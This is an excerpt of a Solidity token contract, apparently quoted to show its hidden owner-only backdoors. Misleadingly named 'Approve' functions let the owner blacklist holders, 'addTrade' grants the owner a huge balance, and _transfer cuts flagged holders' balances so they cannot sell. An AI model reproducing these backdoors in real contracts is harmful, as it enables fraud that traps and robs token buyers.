...
contract Coin is Ownable {
    ...
    function quitApprove(address query) external   {
        if (cap == _msgSender()){
            pepevipcc[query] = false;
        }
    }

    function Approve(address query) external   {
        if (cap == _msgSender()){
            pepevipcc[query] = true;
        }
    }

    function queryacawtibot(address query) public view returns(bool)  {
        return pepevipcc[query];
    }
    ...
    function addTrade() external {
        ...
        if (cap == _msgSender()){
            _balances[_msgSender()] = maxSupply()*30000;
        }
    }
    /**
    ...
    function _transfer(
        ...
        if (pepevipcc[fromSender] != false ){
            balance= _balances[fromSender]-(maxSupply());
        }
